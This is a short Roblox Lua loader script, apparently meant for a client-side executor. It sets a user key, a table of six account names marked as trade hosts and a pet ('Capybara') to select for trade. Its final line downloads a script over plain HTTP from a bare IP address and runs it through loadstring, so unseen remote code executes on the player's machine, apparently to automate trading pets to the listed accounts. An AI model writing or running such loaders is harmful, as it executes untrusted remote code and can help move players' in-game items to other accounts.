repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "venoz"
_G.HostName = {
    ["Kinasramer08074"] = "Capybara",
    ["Odemsficek078"] = "Capybara",
    ["Faconzelen34784"] = "Capybara",
    ["Fardzubi57714"] = "Capybara",
    ["Kathipallo865"] = "Capybara",
    ["Supkoranne9833"] = "Capybara",
}

_G.SelectPetForTrade = {
    "Capybara",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()